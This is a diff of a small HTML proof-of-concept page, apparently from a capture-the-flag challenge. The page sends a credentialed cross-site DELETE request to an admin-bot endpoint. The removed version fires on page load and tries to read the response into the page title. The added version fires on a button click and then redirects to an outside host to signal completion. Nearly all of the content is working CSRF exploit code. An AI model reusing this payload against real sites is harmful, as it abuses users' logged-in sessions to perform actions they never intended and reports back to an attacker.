@@ -1,27 +1,20 @@
 <!doctype html>
 <html>
-<head>
-  <meta charset="utf-8">
-  <title>prepare</title>
+<head><meta charset="utf-8"><title>poc</title></head>
+<body>
+  <button id="go">Submit</button>
   <script>
     async function go() {
       try {
-        // Trigger admin-bot to delete and serve the flag
-        const r = await fetch('http://34.89.179.154:30331/reach_nirvana', {
+        await fetch('http://127.0.0.1:3000/reach_nirvana', {
           method: 'DELETE',
           credentials: 'include'
         });
-        // If CORS allows, exfil via title; if not, this still triggers the delete
-        const t = await r.text().catch(()=>'(blocked by CORS)');
-        document.title = t;
-      } catch(e) {
-        document.title = 'error';
-      }
+      } catch (e) {}
+      // Optional: signal completion to your server
+      setTimeout(() => location.href = 'https://cisco.website/done', 500);
     }
-    window.addEventListener('load', go);
+    document.getElementById('go').addEventListener('click', go);
   </script>
-</head>
-<body>
-  <button>Submit</button>
 </body>
 </html>
